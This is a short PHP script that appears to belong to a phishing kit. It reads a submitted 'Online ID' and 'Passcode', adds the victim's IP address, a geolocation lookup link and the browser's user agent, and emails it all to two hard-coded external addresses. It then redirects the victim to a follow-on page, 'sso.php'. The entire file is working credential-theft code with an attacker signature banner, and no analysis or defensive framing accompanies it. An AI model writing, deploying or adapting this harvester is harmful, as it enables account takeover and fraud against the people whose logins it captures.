<?php
$user = trim($_POST['user']);
$pass = trim($_POST['pass']);
if($user != null && $pass != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	$message .= "Online ID            : ".$user."\n";
	$message .= "Passcode              : ".$pass."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = "doctortunde22@gmail.com, lemmy.wire@yandex.com";
	$subject = "Login : $ip";
    mail($send, $subject, $message);


$Redirect="sso.php";


header("Location: $Redirect");

}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>
